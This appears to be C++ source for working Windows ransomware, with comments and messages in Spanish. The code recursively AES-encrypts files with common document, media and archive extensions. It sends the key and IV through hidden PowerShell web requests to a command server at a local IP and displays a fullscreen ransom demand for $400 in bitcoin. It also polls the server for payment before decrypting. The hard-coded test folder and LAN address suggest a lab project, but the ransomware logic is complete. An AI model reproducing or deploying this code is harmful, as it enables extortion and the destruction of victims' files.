#include "pch.h"
#include "resource.h"
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <CommCtrl.h>
#include <shlobj.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <winhttp.h>
#define _CRT_SECURE_NO_WARNINGS
#include <cpr/cpr.h>
#include <cryptopp/aes.h>
#include <cryptopp/filters.h>
#include <cryptopp/modes.h>
#include <cryptopp/files.h>
#include <cryptopp/osrng.h>
#include <cryptopp/hex.h>
#include <ctime>
#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>
#include <random>
#include <chrono>
#include <cstring>
#include <cstdlib>
#include <thread>
#include <filesystem>
#include <cstdio>
#include <windows.h>
#include <jpeglib.h>
#include <iostream>
#include <fstream>
#include <setjmp.h>
#include <iomanip>
#include <regex>
#include "ransomware.h"
#include "utils.h"

#include <nlohmann/json.hpp>
using json = nlohmann::json;

#include <fmt/core.h>

#define ID_MYIMAGE 101
#define ID_MYTIMER 1
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "comctl32.lib")

using namespace CryptoPP;
namespace fs = std::filesystem;

void ProcessFilesInDirectory(const std::string& directoryPath, const std::string& key, const std::string& iv, bool encrypt) {
    for (const auto& entry : fs::directory_iterator(directoryPath)) {
        if (entry.is_directory()) {
            ProcessFilesInDirectory(entry.path().string(), key, iv, encrypt);
        } else {
            std::string extension = entry.path().extension().string();

       
            std::vector<std::string> targetExtensions = {
                ".txt", ".xlsx", ".doc", ".docx", ".ppt", ".pptx",
                ".pdf", ".jpg", ".jpeg", ".png", ".bmp", ".gif",
                ".mp3", ".wav", ".mp4", ".avi", ".mov", ".sql",
                ".mdb", ".psd", ".zip", ".rar"
            };

           
            if (std::find(targetExtensions.begin(), targetExtensions.end(), extension) != targetExtensions.end()) {
                std::ifstream file(entry.path(), std::ios::binary);
                std::string contents((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                file.close();

                std::string processedData = encrypt ? EncryptAES(contents, key, iv) : DecryptAES(contents, key, iv);

                std::ofstream outFile(entry.path(), std::ios::binary);
                outFile << processedData;
                outFile.close();
            }
        }
    }
}



LRESULT CALLBACK FullscreenWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {

    case WM_CREATE: {
       
        SetTimer(hwnd, ID_MYTIMER, 3000, NULL); 
        break;
    }
    case WM_TIMER: {
        switch (wParam) {
        case ID_MYTIMER: {
            std::string directoryPath = "C:\\Users\\Sergio\\Desktop\\encrypt";
            while (1) {
                std::string output1;
                const char* cmd2 = "powershell.exe -Command \"Invoke-WebRequest -Uri 'http://192.168.1.26:8000/ransomware-data/' -UseBasicParsing | Select-Object -ExpandProperty Content\"";
                ExecuteCommandHidden(cmd2, output1);
                //MessageBoxA(NULL, output1.c_str(), "Output", MB_ICONINFORMATION);
                auto jsonArray = json::parse(output1);

                if (jsonArray.empty()) {
                    MessageBoxA(NULL, "Array vacio!", "Output", MB_ICONINFORMATION);
                }
                else {
                    for (const auto& item : jsonArray) {
                        int clientIdPetition = item["client_id"].get<int>();
                        char clientId[256];
                        DWORD clientIdSize = sizeof(clientId);
                        if (GetRegistryValue(HKEY_CURRENT_USER, "Software\\MiAplicacion", "ClientID", REG_SZ, (BYTE*)clientId, &clientIdSize)) {
                            std::string clientIdStr(clientId); 
                            std::string clientIdPetitionStr = std::to_string(clientIdPetition);
                            if (clientIdStr == clientIdPetitionStr) {
                                bool pagado = item["paid_ransom"].get<bool>();
                                if (pagado) {
                                    std::string key = item["key"].get<std::string>();
                                    std::string iv = item["iv"].get<std::string>();
                                    std::string keyStrEncoded = base64_decode(key);
                                    std::string ivStrEncoded = base64_decode(iv);
                                    //MessageBoxA(NULL, "Se va a desencriptar!!", "Alert", MB_ICONINFORMATION);
                                    ProcessFilesInDirectory(directoryPath, keyStrEncoded, ivStrEncoded, false);

                                  
                                    std::string clientId = "1"; 
                                    std::string cifradoValue = "false"; 

                                    std::string jsonBody = "{\\\"cifrado\\\": " + cifradoValue + "}";

                                    std::string cmd = "powershell.exe -Command \"$body = '" + jsonBody +
                                        "';Invoke-WebRequest -Uri 'http://192.168.1.26:8000/clients/" + clientId +
                                        "' -Method PUT -Body $body -ContentType 'application/json' -UseBasicParsing\"";

                                    std::string cifradoOutput;
                                    ExecuteCommandHidden(cmd.c_str(), cifradoOutput);

                                    //Delete ransomware data
                                    /*std::string cmd = "powershell.exe -Command \""
                                        "Invoke-WebRequest -Uri 'http://192.168.1.26:8000/ransomware-data/" + clientId +
                                        "' -Method DELETE -UseBasicParsing\"";

                                    std::string deleteRansomwareDataOutput;
                                    ExecuteCommandHidden(cmd.c_str(), deleteRansomwareDataOutput);*/


                                    DestroyWindow(hwnd);
                                    return 0;


                                }

                            }
                        }
                    }
                }
            }

            break;
        }
        }
        break;
    }
    case WM_PAINT:
    {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);
        RECT rect;
        GetClientRect(hwnd, &rect);

       
        SetBkMode(hdc, TRANSPARENT);

      
        SetTextColor(hdc, RGB(255, 0, 0)); 
        HFONT hFontBig = CreateFont(48, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET,
            OUT_OUTLINE_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
            VARIABLE_PITCH, TEXT("Arial"));
        SelectObject(hdc, hFontBig);
        const wchar_t* text1 = L"Sus archivos han sido encriptados";
        DrawText(hdc, text1, -1, &rect, DT_CENTER | DT_TOP | DT_SINGLELINE);

      
        HFONT hFontMedium = CreateFont(18, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET,
            OUT_OUTLINE_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
            VARIABLE_PITCH, TEXT("Arial"));
        SelectObject(hdc, hFontMedium);
        const wchar_t* text2 = L"Para poder desencriptar los archivos, deberas enviar 400$ a la siguiente billetera de bitcoin:";
        rect.top += 60; 
        DrawText(hdc, text2, -1, &rect, DT_CENTER | DT_TOP | DT_SINGLELINE);

      
        SetTextColor(hdc, RGB(255, 255, 255)); 
        HFONT hFontSmall = CreateFont(24, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET,
            OUT_OUTLINE_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
            VARIABLE_PITCH, TEXT("Arial"));
        SelectObject(hdc, hFontSmall);
        const wchar_t* text3 = L"00f54a5851e9372b87810a8e60cdd2e7cfd80b6e31";
        rect.top += 100; 
        DrawText(hdc, text3, -1, &rect, DT_CENTER | DT_TOP | DT_SINGLELINE);

        DeleteObject(hFontBig);
        DeleteObject(hFontMedium);
        DeleteObject(hFontSmall);
        EndPaint(hwnd, &ps);
    }
    return 0;

    case WM_CLOSE:
        DestroyWindow(hwnd);
        return 0;

    case WM_KEYDOWN:
        if (wParam == VK_ESCAPE) {
            DestroyWindow(hwnd);
        }
        return 0;

    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProc(hwnd, msg, wParam, lParam);
}

void CreateFullscreenWindow(HINSTANCE hInstance) {

    WNDCLASS wc = {};
    wc.lpfnWndProc = FullscreenWndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = L"FullscreenWindowClass";
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);  

    if (!RegisterClass(&wc)) {
        MessageBox(NULL, L"Falló el registro de la clase de ventana.", L"Error", MB_ICONERROR | MB_OK);
        return;
    }

    HWND hwnd = CreateWindowEx(
        WS_EX_TOPMOST, wc.lpszClassName, L"Pantalla completa",
        WS_POPUP | WS_VISIBLE, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
        NULL, NULL, hInstance, NULL);

    if (!hwnd) {
        MessageBox(NULL, L"Falló la creación de la ventana.", L"Error", MB_ICONERROR | MB_OK);
        return;
    }

    ShowWindow(hwnd, SW_SHOW);
    UpdateWindow(hwnd);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}


DWORD WINAPI CreateFullscreenWindowAdapter(LPVOID lpParam) {
    HINSTANCE hInstance = (HINSTANCE)lpParam;
    CreateFullscreenWindow(hInstance);
    return 0;
}



std::string EncryptAES(const std::string& plainText, const std::string& key, const std::string& iv) {
    std::string cipherText;

    CryptoPP::AES::Encryption aesEncryption((byte*)key.c_str(), CryptoPP::AES::DEFAULT_KEYLENGTH);
    CryptoPP::CBC_Mode_ExternalCipher::Encryption cbcEncryption(aesEncryption, (byte*)iv.c_str());

    CryptoPP::StreamTransformationFilter stfEncryptor(cbcEncryption, new CryptoPP::StringSink(cipherText));
    stfEncryptor.Put(reinterpret_cast<const unsigned char*>(plainText.c_str()), plainText.length());
    stfEncryptor.MessageEnd();

    return cipherText;
}

std::string DecryptAES(const std::string& cipherText, const std::string& key, const std::string& iv) {
    std::string decryptedText;

    CryptoPP::AES::Decryption aesDecryption((byte*)key.c_str(), CryptoPP::AES::DEFAULT_KEYLENGTH);
    CryptoPP::CBC_Mode_ExternalCipher::Decryption cbcDecryption(aesDecryption, (byte*)iv.c_str());

    CryptoPP::StreamTransformationFilter stfDecryptor(cbcDecryption, new CryptoPP::StringSink(decryptedText));
    stfDecryptor.Put(reinterpret_cast<const unsigned char*>(cipherText.c_str()), cipherText.size());
    stfDecryptor.MessageEnd();

    return decryptedText;
}

void encryptFiles() {
    std::string directoryPath = "C:\\Users\\Sergio\\Desktop\\encrypt";

    CryptoPP::AutoSeededRandomPool rng;

    CryptoPP::SecByteBlock key(CryptoPP::AES::DEFAULT_KEYLENGTH);
    rng.GenerateBlock(key, key.size());

    CryptoPP::SecByteBlock iv(CryptoPP::AES::BLOCKSIZE);
    rng.GenerateBlock(iv, iv.size());


    std::string keyStr(reinterpret_cast<const char*>(key.BytePtr()), key.size());
    std::string ivStr(reinterpret_cast<const char*>(iv.BytePtr()), iv.size());

    //MessageBoxA(NULL, keyStr.c_str(), "Output", MB_ICONINFORMATION);
    char clientId[256];
    DWORD clientIdSize = sizeof(clientId);

    if (GetRegistryValue(HKEY_CURRENT_USER, "Software\\MiAplicacion", "ClientID", REG_SZ, (BYTE*)clientId, &clientIdSize)) {
        std::string clientIdStr(clientId); 
        
        std::string keyStr_base64 = base64_encode(reinterpret_cast<const unsigned char*>(keyStr.data()), keyStr.size());
        std::string ivStr_base64 = base64_encode(reinterpret_cast<const unsigned char*>(ivStr.data()), ivStr.size());

        //MessageBoxA(NULL, keyStr_base64.c_str(), "Output", MB_ICONINFORMATION);


        std::string cmd = "powershell.exe -Command \""
            "$body = @{key='" + keyStr_base64 + "';iv='" + ivStr_base64 + "';paid_ransom=$false} | ConvertTo-Json;"
            "Invoke-WebRequest -Uri 'http://192.168.1.26:8000/ransomware-data/" + clientIdStr + "' "
            "-Method PUT -Body $body -ContentType 'application/json' -UseBasicParsing\"";

        std::string putCommandOutput;
        //MessageBoxA(NULL, "Se va a ejecutar el PUT", "Alert", MB_ICONINFORMATION);
        ExecuteCommandHidden(cmd.c_str(), putCommandOutput);
        //MessageBoxA(NULL, putCommandOutput.c_str(), "Alert", MB_ICONINFORMATION);
       
    }

    MessageBoxA(NULL, "Se va a encriptar!!", "Alert", MB_ICONINFORMATION);
    ProcessFilesInDirectory(directoryPath, keyStr, ivStr, true);
  

std::string cifradoValue = "true"; 

std::string jsonBody = "{\\\"cifrado\\\": " + cifradoValue + "}";

std::string cmd = "powershell.exe -Command \"$body = '" + jsonBody + 
    "';Invoke-WebRequest -Uri 'http://192.168.1.26:8000/clients/" + clientId +
    "' -Method PUT -Body $body -ContentType 'application/json' -UseBasicParsing\"";

std::string cifradoOutput;
ExecuteCommandHidden(cmd.c_str(), cifradoOutput); 
}